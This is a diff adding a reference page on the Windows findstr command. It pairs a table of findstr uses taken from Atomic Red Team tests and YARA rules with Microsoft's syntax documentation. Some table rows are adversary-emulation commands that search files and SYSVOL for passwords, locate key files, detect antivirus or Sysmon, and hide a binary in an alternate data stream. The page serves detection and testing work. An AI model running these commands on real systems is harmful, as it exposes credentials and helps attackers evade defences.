+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md">T1490.md</a></td>
+      <td>if(!(vssadmin.exe list shadows | findstr “No items found that satisfy the query.”)) { exit 0 } else { exit 1 }</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md">T1518.001.md</a></td>
+      <td>tasklist.exe | findstr /i virus</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md">T1518.001.md</a></td>
+      <td>tasklist.exe | findstr /i cb</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md">T1518.001.md</a></td>
+      <td>tasklist.exe | findstr /i defender</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md">T1518.001.md</a></td>
+      <td>tasklist.exe | findstr /i cylance</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md">T1518.001.md</a></td>
+      <td>fltmc.exe | findstr.exe 385201</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md">T1552.001.md</a></td>
+      <td>- <a href="#atomic-test-3---extracting-passwords-with-findstr">Atomic Test #3 - Extracting passwords with findstr</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md">T1552.001.md</a></td>
+      <td>## Atomic Test #3 - Extracting passwords with findstr</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md">T1552.001.md</a></td>
+      <td>findstr /si pass *.xml *.doc *.txt *.xls</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md">T1552.004.md</a></td>
+      <td>dir c:\ /b /s .key | findstr /e .key</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md">T1552.006.md</a></td>
+      <td>- <a href="#atomic-test-1---gpp-passwords-findstr">Atomic Test #1 - GPP Passwords (findstr)</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md">T1552.006.md</a></td>
+      <td>## Atomic Test #1 - GPP Passwords (findstr)</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md">T1552.006.md</a></td>
+      <td>findstr /S cpassword %logonserver%\sysvol*.xml</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md">T1562.001.md</a></td>
+      <td>if ((cmd.exe /c “where.exe Sysmon.exe 2&gt; nul | findstr Sysmon 2&gt; nul”) -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md">T1562.001.md</a></td>
+      <td>if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md">T1562.001.md</a></td>
+      <td>if(cmd.exe /c “where.exe Sysmon.exe 2&gt; nul | findstr Sysmon 2&gt; nul”) { C:\Windows\Sysmon.exe -accepteula -i } else</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md">T1562.001.md</a></td>
+      <td>if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md">T1564.004.md</a></td>
+      <td>findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe &gt; #{path}\file.txt:procexp.exe</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar">apt_eqgrp_apr17.yar</a></td>
+      <td>$x1 = “@@for /f "delims=" %%i in (‘findstr /smc:"%s" *.msg’) do if not "%%MsgFile1%%"=="%%i" del /f "%%i"” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar">apt_lazarus_dec17.yar</a></td>
+      <td>$x8 = “whoami /groups | findstr /c:"S-1-5-32-544"” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar">gen_susp_lnk_files.yar</a></td>
+      <td>$command = “C:\Windows\System32\cmd.exe” fullword ascii //cmd is precursor to findstr</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar">gen_susp_lnk_files.yar</a></td>
+      <td>$command2 =  {2F 00 63 00 20 00 66 00 69 00 6E 00 64 00 73 00 74 00 72} //findstr in hex</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="additional-info">Additional Info*</h2>
+
+<p><em>*The information below is copied from <a href="https://github.com/MicrosoftDocs/windowsserverdocs">MicrosoftDocs</a>, which is maintained by <a href="https://opensource.microsoft.com/codeofconduct/">Microsoft</a>. Available under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> license.</em></p>
+
+<hr />
+
+<h2 id="findstr">findstr</h2>
+
+<p>Searches for patterns of text in files.</p>
+
+<h3 id="syntax">Syntax</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:&lt;file&gt;] [/c:&lt;string&gt;] [/g:&lt;file&gt;] [/d:&lt;dirlist&gt;] [/a:&lt;colorattribute&gt;] [/off[line]] &lt;strings&gt; [&lt;drive&gt;:][&lt;path&gt;]&lt;filename&gt;[ ...]
+</code></pre></div></div>
+
+<h4 id="parameters">Parameters</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parameter</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>/b</td>
+      <td>Matches the text pattern if it is at the beginning of a line.</td>
+    </tr>
+    <tr>
+      <td>/e</td>
+      <td>Matches the text pattern if it is at the end of a line.</td>
+    </tr>
+    <tr>
+      <td>/l</td>
+      <td>Processes search strings literally.</td>
+    </tr>
+    <tr>
+      <td>/r</td>
+      <td>Processes search strings as regular expressions. This is the default setting.</td>
+    </tr>
+    <tr>
+      <td>/s</td>
+      <td>Searches the current directory and all subdirectories.</td>
+    </tr>
+    <tr>
+      <td>/i</td>
+      <td>Ignores the case of the characters when searching for the string.</td>
+    </tr>
+    <tr>
+      <td>/x</td>
+      <td>Prints lines that match exactly.</td>
+    </tr>
+    <tr>
+      <td>/v</td>
+      <td>Prints only lines that don’t contain a match.</td>
+    </tr>
+    <tr>
+      <td>/n</td>
+      <td>Prints the line number of each line that matches.</td>
+    </tr>
+    <tr>
+      <td>/m</td>
+      <td>Prints only the file name if a file contains a match.</td>
+    </tr>
+    <tr>
+      <td>/o</td>
+      <td>Prints character offset before each matching line.</td>
+    </tr>
+    <tr>
+      <td>/p</td>
+      <td>Skips files with non-printable characters.</td>
+    </tr>
+    <tr>
+      <td>/off[line]</td>
+      <td>Does not skip files that have the offline attribute set.</td>
+    </tr>
+    <tr>
+      <td>/f:<code class="language-plaintext highlighter-rouge">&lt;file&gt;</code></td>
+      <td>Gets a file list from the specified file.</td>
+    </tr>
+    <tr>
+      <td>/c:<code class="language-plaintext highlighter-rouge">&lt;string&gt;</code></td>
+      <td>Uses the specified text as a literal search string.</td>
+    </tr>
+    <tr>
+      <td>/g:<code class="language-plaintext highlighter-rouge">&lt;file&gt;</code></td>
+      <td>Gets search strings from the specified file.</td>
+    </tr>
+    <tr>
+      <td>/d:<code class="language-plaintext highlighter-rouge">&lt;dirlist&gt;</code></td>
+      <td>Searches the specified list of directories. Each directory must be separated with a semicolon (;), for example <code class="language-plaintext highlighter-rouge">dir1;dir2;dir3</code>.</td>
+    </tr>
+    <tr>
+      <td>/a:<code class="language-plaintext highlighter-rouge">&lt;colorattribute&gt;</code></td>
+      <td>Specifies color attributes with two hexadecimal digits. Type <code class="language-plaintext highlighter-rouge">color /?</code> for additional information.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">&lt;strings&gt;</code></td>
+      <td>Specifies the text to search for in <em>filename</em>. Required.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">[\&lt;drive&gt;:][&lt;path&gt;]&lt;filename&gt;[...]</code></td>
+      <td>Specifies the location and file or files to search. At least one file name is required.</td>
+    </tr>
+    <tr>
+      <td>/?</td>
+      <td>Displays Help at the command prompt.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h5 id="remarks">Remarks</h5>
+
+<ul>
+  <li>
+    <p>All <strong>findstr</strong> command-line options must precede <em>strings</em> and <em>filename</em> in the command string.</p>
+  </li>
+  <li>
+    <p>Regular expressions use both literal characters and meta-characters to find patterns of text, rather than exact strings of characters.</p>
+
+    <ul>
+      <li>
+        <p>A literal character is a character that doesn’t have a special meaning in the regular-expression syntax; instead, it matches an occurrence of that character. For example, letters and numbers are literal characters.</p>
+      </li>
+      <li>
+        <p>A meta-character is a symbol with special meaning (an operator or delimiter) in the regular-expression syntax.</p>
+
+        <p>The accepted meta-characters are:</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Meta-character</th>
+              <th>Value</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">.</code></td>
+              <td><strong>Wildcard</strong> - Any character</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">*</code></td>
+              <td><strong>Repeat</strong> - Zero or more occurrences of the previous character or class.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">^</code></td>
+              <td><strong>Beginning line position</strong> - Beginning of the line.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">$</code></td>
+              <td><strong>Ending line position</strong> - End of the line.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">[class]</code></td>
+              <td><strong>Character class</strong> - Any one character in a set.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">[^class]</code></td>
+              <td><strong>Inverse class</strong> - Any one character not in a set.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">[x-y]</code></td>
+              <td><strong>Range</strong> - Any characters within the specified range.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">\x</code></td>
+              <td><strong>Escape</strong> - Literal use of a meta-character.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">\&lt;string</code></td>
+              <td><strong>Beginning word position</strong> - Beginning of the word.</td>
+            </tr>
+            <tr>
+              <td><code class="language-plaintext highlighter-rouge">string\&gt;</code></td>
+              <td><strong>Ending word position</strong> - End of the word.</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p>The special characters in regular expression syntax have the most power when you use them together. For example, use the combination of the wildcard character (<code class="language-plaintext highlighter-rouge">.</code>) and repeat (<code class="language-plaintext highlighter-rouge">*</code>) character to match any string of characters: <code class="language-plaintext highlighter-rouge">.*</code></p>
+
+        <p>Use the following expression as part of a larger expression to match any string beginning with <em>b</em> and ending with <em>ing</em>: <code class="language-plaintext highlighter-rouge">b.*ing</code></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>To search for multiple strings in a set of files, you must create a text file that contains each search criterion on a separate line.</p>
+  </li>
+  <li>
+    <p>Use spaces to separate multiple search strings unless the argument is prefixed with <strong>/c</strong>.</p>
+  </li>
+</ul>
+
+<h4 id="examples">Examples</h4>
+
+<p>To search for <em>hello</em> or <em>there</em> in file <em>x.y</em>, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr hello there x.y
+</code></pre></div></div>
+
+<p>To search for <em>hello there</em> in file <em>x.y</em>, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /c:hello there x.y
+</code></pre></div></div>
+
+<p>To find all occurrences of the word <em>Windows</em> (with an initial capital letter W) in the file <em>proposal.txt</em>, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr Windows proposal.txt
+</code></pre></div></div>
+
+<p>To search every file in the current directory and all subdirectories that contained the word <em>Windows</em>, regardless of the letter case, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /s /i Windows *.*
+</code></pre></div></div>
+
+<p>To find all occurrences of lines that begin with <em>FOR</em> and are preceded by zero or more spaces (as in a computer program loop), and to display the line number where each occurrence is found, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /b /n /r /c:^ *FOR *.bas
+</code></pre></div></div>
+
+<p>To list the exact files that you want to search in a text file, use the search criteria in the file <em>stringlist.txt</em>, to search the files listed in <em>filelist.txt</em>, and then to store the results in the file <em>results.out</em>, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /g:stringlist.txt /f:filelist.txt &gt; results.out
+</code></pre></div></div>
+
+<p>To list every file containing the word <em>computer</em> within the current directory and all subdirectories, regardless of case, type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /s /i /m \&lt;computer\&gt; *.*
+</code></pre></div></div>
+
+<p>To list every file containing the word computer and any other words that begin with comp, (such as compliment and compete), type:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /s /i /m \&lt;comp.* *.*
+</code></pre></div></div>
+
+<h3 id="additional-references">Additional References</h3>
+
+<ul>
+  <li><a href="https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md">Command-Line Syntax Key</a></li>
+</ul>
+
+<hr />
+
+<p>MIT License. Copyright (c) 2020 Strontic.</p>
+
+
+    </section>
+  </article>
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form onsubmit="return googleCustomSearchExecute();" id="cse-search-box-form-id">
+    <label class="sr-only" for="cse-search-input-box-id">
+      Enter your search term...
+    </label>
+    <input type="search" id="cse-search-input-box-id" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results">
+    <gcse:searchresults-only></gcse:searchresults-only>
+  </div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://strontic.com" rel="nofollow noopener noreferrer"><i class="fab fa-blogger" aria-hidden="true"></i> strontic.com</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/strontic20" rel="nofollow noopener noreferrer"><i class="fab fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-github-square" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://instagram.com/strontic20" rel="nofollow noopener noreferrer"><i class="fab fa-instagram-square" aria-hidden="true"></i> Instagram</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/company/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://www.facebook.com/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-facebook-square" aria-hidden="true"></i> Facebook</a></li>
+        
+      
+        
+          <li><a href="mailto:info@strontic.com" rel="nofollow noopener noreferrer"><i class="fas fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 STRONTIC. Theme: <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+<script>
+  (function () {
+    var cx = '31f5caf6441fb12c8';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+
+  function googleCustomSearchExecute() {
+    var input = document.getElementById('cse-search-input-box-id');
+    var element = google.search.cse.element.getElement('searchresults-only0');
+    if (input.value == '') {
+      element.clearAllResults();
+    } else {
+      element.execute(input.value);
+    }
+    return false;
+  }
+
+  
+</script>
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-179392403-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-179392403-1', { 'anonymize_ip': true});
+</script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
